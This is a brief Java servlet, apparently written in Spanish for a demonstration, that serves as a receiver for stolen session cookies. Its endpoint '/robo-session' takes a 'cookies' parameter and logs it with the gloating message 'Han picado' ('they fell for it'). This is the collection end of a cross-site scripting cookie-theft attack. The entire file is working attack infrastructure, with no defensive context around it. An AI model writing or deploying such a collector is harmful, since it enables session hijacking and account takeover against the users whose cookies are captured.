import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

@WebServlet("/robo-session")
public class RoboSessionServlet extends HttpServlet {
	
	public void doGet(HttpServletRequest req, HttpServletResponse res) {
		String cookies = req.getParameter("cookies");
		System.out.println("------> Han picado. Cookies: " + cookies);
	}
}
